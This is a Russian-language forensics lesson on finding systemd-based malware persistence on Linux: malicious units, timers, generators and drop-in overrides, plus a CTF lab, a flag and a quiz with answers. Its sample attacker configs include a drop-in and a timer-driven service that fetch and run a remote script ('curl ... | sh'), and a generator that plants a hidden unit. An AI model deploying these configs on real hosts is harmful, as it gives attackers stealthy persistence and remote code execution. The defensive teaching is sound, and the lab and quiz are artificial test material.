---
id: linux-systemd-persistence
title: "systemd-персистентность: юниты, таймеры и drop-in"
category: forensics
parent: forensics-linux-artifacts-advanced
difficulty: hard
order: 3
tags: [linux, systemd, unit, timer, persistence, forensics, drop-in]
prerequisites: [forensics-linux-artifacts]
useful_for:
  - "CTF Forensics категория"
  - "DFIR / Incident Response"
  - "Threat Hunting"
estimated_minutes: 50
summary: "Как малварь закрепляется в Linux через systemd: юниты, таймеры, генераторы, drop-in-каталоги и user-юниты — где искать и как отличить легитимное от вредоносного."
lab:
  kind: shell
  title: 'Практика: вредоносный systemd-юнит'
  toolset: [core, grep, strings]
  workdir: /home/student/task
  files: [task.md, systemd-networkd-helper.service, systemd-networkd-helper]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - '`cat *.service` — прочитай юнит и его ExecStart.'
    - '`file systemd-networkd-helper` — это бинарник (ELF).'
    - 'Флаг спрятан внутри бинарника: `strings`.'
    - 'Выдели флаг: `strings systemd-networkd-helper | grep nto > found.txt`.'
---

## Вопрос, с которого всё начинается

На Linux-сервере после перезагрузки снова появляется подозрительная активность, хотя
файл малвари на первый взгляд удалён. Значит, есть **точка автозапуска**. В современных
дистрибутивах таких точек десятки, и самая важная — **systemd**.

Разберём сквозной пример: найдём вредоносный systemd-юнит и поймём, как он закрепляет
малварь.

## Что такое systemd

**systemd** — система инициализации и управления службами в большинстве современных
дистрибутивов. Она запускает службы (**юниты**), описанные файлами `.service`, и умеет
запускать их по расписанию (**таймеры**, `.timer`), при событиях (**`.path`**, `.socket`)
и в других режимах.

Файлы юнитов лежат в нескольких каталогах, и **порядок приоритета** важен:

- `/etc/systemd/system/` — администраторские юниты (высший приоритет).
- `/run/systemd/system/` — созданные во время работы (например, генератором).
- `/usr/lib/systemd/system/` — «родные» юниты пакетов.

Каталог `/etc` перекрывает `/usr/lib`: если в обоих есть юнит с одним именем, победит
версия из `/etc`. Именно сюда часто кладут вредоносные юниты — они выглядят как обычные
службы.

## Наш пример: вредоносный юнит

Ищем юниты, созданные или изменённые в дни инцидента:

```
$ find /etc/systemd/system -type f -newermt '2026-03-14' -ls
... /etc/systemd/system/systemd-networkd-helper.service
```

Имя маскируется под системное (`systemd-networkd-helper`), но такого юнита в дистрибутиве
нет. Открываем:

```
$ cat /etc/systemd/system/systemd-networkd-helper.service
[Unit]
Description=Network helper
After=network.target

[Service]
Type=simple
ExecStart=/usr/lib/systemd/systemd-networkd-helper --daemon
Restart=always
User=root

[Install]
WantedBy=multi-user.target
```

Разбираем: `ExecStart` указывает на бинарник в `/usr/lib/systemd/` (маскировка под
системный), `Restart=always` гарантирует перезапуск, `User=root` — высокие права,
`WantedBy=multi-user.target` включает автозапуск при старте системы.

Смотрим сам бинарник:

```
$ ls -l /usr/lib/systemd/systemd-networkd-helper
-rwxr-xr-x 1 root root 882144 ... /usr/lib/systemd/systemd-networkd-helper
$ strings /usr/lib/systemd/systemd-networkd-helper | grep -i nto
nto{systemd_un1t_p3rs1st3nc3}
```

Флаг подтверждает: это и есть закрепление. Причём `Restart=always` означает, что даже
если убить процесс, systemd его перезапустит — классический приём устойчивости.

## Проверка «включённости»

Файл юнита — ещё не гарантия, что он запустится: нужно, чтобы он был **включён**. Смотрим
символические ссылки в `multi-user.target.wants`:

```
$ ls -l /etc/systemd/system/multi-user.target.wants/ | grep networkd-helper
... systemd-networkd-helper.service -> /etc/systemd/system/systemd-networkd-helper.service
```

Симлинк в каталоге `.wants` — признак включённого юнита. Именно так `systemctl enable`
включает автозапуск.

## Таймеры, генераторы и drop-in

Кроме простых юнитов, есть менее очевидные механизмы:

- **Таймеры (`.timer`)** — запускают службу по расписанию (аналог cron). Вредоносный
  таймер с `OnBootSec`/`OnUnitActiveSec` периодически перезапускает малварь.
- **Генераторы** (`/etc/systemd/system-generators/`) — скрипты, которые **во время
  загрузки** создают юниты «на лету» в `/run/systemd/system/`. Такой юнит не лежит на
  диске постоянно, что затрудняет поиск.
- **Drop-in-каталоги** (`<unit>.service.d/*.conf`) — переопределяют отдельные параметры
  существующего юнита. Атакующий может **не создавать** новый юнит, а добавить drop-in к
  легитимному, изменив `ExecStart` или `ExecStartPre`.

Пример вредоносного drop-in:

```
$ cat /etc/systemd/system/ssh.service.d/override.conf
[Service]
ExecStartPre=/usr/bin/curl -s http://10.10.20.9/p | sh
```

Юнит `ssh.service` остаётся «родным», но перед запуском выполняет команду атакующего.
Именно поэтому проверять надо не только новые юниты, но и **каталоги `.d`** у штатных.

## User-юниты и другие каталоги

Пользовательские юниты лежат в `~/.config/systemd/user/` и запускаются при входе
пользователя (`systemctl --user`). Они позволяют закрепиться **без прав root** — важный
вектор. Кроме systemd, проверяют и другие точки:

- `/etc/rc.local`, `/etc/init.d/` — старые механизмы.
- `/etc/cron.*`, `crontab -l`, `/var/spool/cron/` — планировщик.
- `~/.config/autostart/` — графический автозапуск.
- `/etc/ld.so.preload` — подгрузка библиотеки во все процессы.

## Практический сценарий: находим таймер, перезапускающий малварь

Разберём сценарий, в котором малварь «возвращается» каждые несколько минут. Простое
удаление процесса не помогает — значит, работает **таймер** systemd.

Начинаем со списка таймеров, созданных недавно:

```
$ find /etc/systemd/system -name '*.timer' -newermt '2026-03-14' -ls
... /etc/systemd/system/systemd-sysupdate.timer
```

Имя маскируется под системное обновление, но такого таймера в дистрибутиве нет. Смотрим
его:

```
$ cat /etc/systemd/system/systemd-sysupdate.timer
[Unit]
Description=System update checker

[Timer]
OnBootSec=2min
OnUnitActiveSec=5min
Unit=systemd-sysupdate.service

[Install]
WantedBy=timers.target
```

Разбираем параметры. `OnBootSec=2min` запускает задачу через 2 минуты после загрузки,
`OnUnitActiveSec=5min` повторяет каждые 5 минут. `Unit=systemd-sysupdate.service`
указывает, какую службу запускать. Итог: даже если убить процесс, через 5 минут он
поднимется снова. Это классическая устойчивость через таймер.

Смотрим связанную службу:

```
$ cat /etc/systemd/system/systemd-sysupdate.service
[Service]
Type=oneshot
ExecStart=/bin/sh -c 'curl -s http://10.10.20.9/p | sh'
```

`Type=oneshot` — задача выполняется один раз и завершается; `ExecStart` загружает и
запускает скрипт из сети. Такой таймер не держит процесс постоянно, поэтому его легко
пропустить при беглом осмотре `ps`.

## Генераторы: юниты «на лету»

Генератор — это исполняемый файл в `/etc/systemd/system-generators/`, который systemd
запускает **при каждой загрузке**. Генератор может создать юнит прямо в
`/run/systemd/system/`, и на диске этого юнита не будет — только скрипт-генератор.

```
$ ls -l /etc/systemd/system-generators/
-rwxr-xr-x 1 root root 2048 ... /etc/systemd/system-generators/net-helper
$ cat /etc/systemd/system-generators/net-helper
#!/bin/sh
cat > /run/systemd/system/net-helper.service <<EOF
[Service]
ExecStart=/usr/lib/.x/hidden
Restart=always
EOF
EOF
```

Такой приём прячет юнит от простого `find` по `/etc`. Поэтому при расследовании
проверяют **и** каталоги генераторов, **и** содержимое `/run/systemd/system/` на живой
системе (после перезагрузки оно очищается).

## Drop-in у штатных юнитов

Самый незаметный приём — **не создавать** новый юнит, а переопределить существующий.
Каталог `<unit>.service.d/` рядом с юнитом содержит дополнительные `.conf`-файлы, которые
systemd «накладывает» поверх основного. Атакующему достаточно добавить один параметр:

```
$ ls /etc/systemd/system/*.d/ 2>/dev/null
/etc/systemd/system/ssh.service.d/
$ cat /etc/systemd/system/ssh.service.d/override.conf
[Service]
ExecStartPre=/usr/bin/curl -s http://10.10.20.9/p | sh
```

Юнит `ssh.service` остаётся «родным», но перед запуском выполняет команду атакующего.
Именно поэтому проверяют не только новые юниты, но и **все** каталоги `.d` у штатных.

## Сравнение с эталоном

Надёжный способ найти подмену — сравнить текущие юниты с эталонными из пакетов. Для этого
используют проверку целостности пакетов:

```
$ rpm -Va | grep '^..5'
$ debsums -c
```

Изменённые файлы (в том числе юниты) будут в списке. Дополнительно сравнивают содержимое
`/etc/systemd/system` с резервной копией, если она есть. Так выявляют даже хорошо
замаскированные правки.

## Частые ошибки

- **Смотреть только `.service`.** Таймеры, `.path`, `.socket` и генераторы тоже запускают
  код.
- **Игнорировать drop-in-каталоги `.d`.** Подмена живёт именно там.
- **Забывать про user-юниты.** `~/.config/systemd/user` не требует root.
- **Путать «создан» и «включён».** Файл юнита без симлинка в `.wants` может не
  запускаться.

## Шпаргалка команд

```
# Все юниты, изменённые за период
find /etc/systemd/system -type f -newermt '2026-03-14'
# Включённые юниты
systemctl list-unit-files --state=enabled
# Содержимое юнита с учётом drop-in
systemctl cat <unit>
# Проверить целостность пакетов
rpm -Va | grep '^..5'   # RHEL
debsums -c              # Debian
```

## Что это даёт в отчёте

По systemd-персистентности в отчёте фиксируют: имя юнита/таймера, путь к исполняемому
файлу, права (root/пользователь), способ запуска (boot/timer/path/generator/drop-in) и
связь с первоначальным вектором. Это объясняет, **почему малварь возвращается** и какие
действия нужны для полного удаления — недостаточно убить процесс, надо удалить точку
автозапуска.

## Связь с другими точками автозапуска

systemd — не единственное место закрепления, и на практике его проверяют в связке с
остальными. Полный список точек на Linux включает: systemd-юниты и таймеры, cron
(`/etc/cron.*`, `/var/spool/cron`, пользовательские `crontab -l`), `rc.local` и скрипты
`init.d`, каталоги `~/.config/autostart` и `~/.config/systemd/user`, а также
`/etc/ld.so.preload` (подгрузка библиотеки во все процессы) и правки в `~/.bashrc`/
`~/.profile` (запуск при входе в shell).

Практика показывает, что продвинутая малварь ставит **несколько** точек сразу — например,
systemd-юнит плюс cron-задачу как резерв. Поэтому, найдя одну точку, аналитик обязан
проверить все остальные, иначе после «очистки» закрепление восстановится из другого
места.

## Итоговая методика

Полный порядок: получить список всех юнитов и таймеров, отфильтровать недавно изменённые,
проверить drop-in-каталоги `.d`, осмотреть генераторы и `/run/systemd/system`, затем
пройтись по cron, autostart и профилям shell. Результат свести в таблицу «точка запуска →
путь → права → триггер». Такой системный обход гарантирует, что ни одна из точек не будет
пропущена, и делает вывод о полном удалении закрепления обоснованным, а не
предположительным.

## Проверка на «живой» системе

Помимо файлов на диске, на работающей системе полезно спросить сам systemd, что он
запустил. Команда `systemctl list-units --type=service --state=running` покажет активные
службы, а `systemctl status <unit>` — путь к юниту и время запуска. Если активная служба
не имеет соответствующего файла в ожидаемом каталоге, значит, юнит создан генератором или
загружен из `/run` — это повод разобраться.

## Что мы теперь знаем

- **systemd** — главный механизм служб в Linux; юниты лежат в `/etc`, `/run`, `/usr/lib`.
- **`/etc` перекрывает `/usr/lib`** — вредоносные юниты часто кладут в `/etc`.
- Признаки вредоносного юнита: маскировка под системный, `ExecStart` на странный путь,
  `Restart=always`, `User=root`.
- **Включённость** подтверждается симлинком в `*.wants`.
- Опасны **drop-in-каталоги** (`.d`) у штатных юнитов, **таймеры** и **генераторы**.
- Пользовательские юниты (`~/.config/systemd/user`) дают закрепление без root.

## Квиз

Проверь себя.

```quiz
- question: "Какой каталог systemd-юнитов имеет приоритет?"
  options:
    - "/etc/systemd/system"
    - "/usr/lib/systemd/system"
    - "/run/systemd/system"
    - "/var/lib/systemd"
  answer: 0
  explanation: "Юниты из /etc перекрывают юниты из /usr/lib с тем же именем."
- question: "Что означает Restart=always в юните?"
  options:
    - "Служба автоматически перезапускается при завершении"
    - "Служба запускается один раз"
    - "Служба отключена"
    - "Служба работает только ночью"
  answer: 0
  explanation: "Restart=always обеспечивает устойчивость — перезапуск после убийства процесса."
- question: "Где искать юниты, созданные генератором во время загрузки?"
  options:
    - "/run/systemd/system"
    - "/etc/shadow"
    - "/var/log/auth.log"
    - "/usr/bin"
  answer: 0
  explanation: "Генераторы создают юниты в /run/systemd/system — они не лежат на диске постоянно."
- question: "Как атакующий может изменить легитимный юнит, не создавая новый?"
  options:
    - "Добавив drop-in-файл в каталог <unit>.service.d/"
    - "Переименовав /etc/passwd"
    - "Удалив /usr/lib"
    - "Изменив /etc/hosts"
  answer: 0
  explanation: "Drop-in в каталоге .d переопределяет параметры юнита, например ExecStartPre."
```

## Куда дальше

Мы разобрали точки автозапуска systemd. Дальше займёмся **историей shell**: что именно
вводили руками, как читать таймстемпы и как распознать подчистку. А пока главное запомни:
**systemd-персистентность живёт не только в новых юнитах, но и в drop-in, таймерах и
генераторах**.

## Где пригодится

- **CTF Forensics:** задачи с Linux-сервером и закреплением.
- **DFIR:** поиск точек автозапуска после компрометации.
- **Threat Hunting:** охота на аномальные юниты и таймеры.
- **Работа:** реагирование на инциденты на серверах.
